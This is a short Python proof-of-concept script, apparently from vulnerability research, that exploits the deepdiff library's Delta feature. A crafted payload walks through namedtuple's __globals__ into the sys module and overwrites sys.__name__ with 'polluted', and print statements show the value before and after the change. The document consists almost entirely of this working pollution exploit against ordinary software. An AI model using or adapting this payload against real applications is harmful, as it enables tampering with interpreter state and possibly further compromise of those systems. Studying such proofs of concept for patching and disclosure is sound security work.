from deepdiff import Delta
from collections import namedtuple
import sys

# Payload
payload = {
  "attribute_added" : {
    "root['function']": namedtuple,
    "root['function'].'__globals__'['_sys'].'__name__'": "polluted",
  }
}

# Before the pollution check
print(f"Before the pollution: sys.__name__ = {getattr(sys, "__name__")}")

# Pollution
delta = Delta(payload)
obj1 = {"a": 1, "b": 2, "c": 3}
obj1 = obj1 + delta

# After the pollution check
print(f"After the pollution: sys.__name__ = {getattr(sys, "__name__")}")
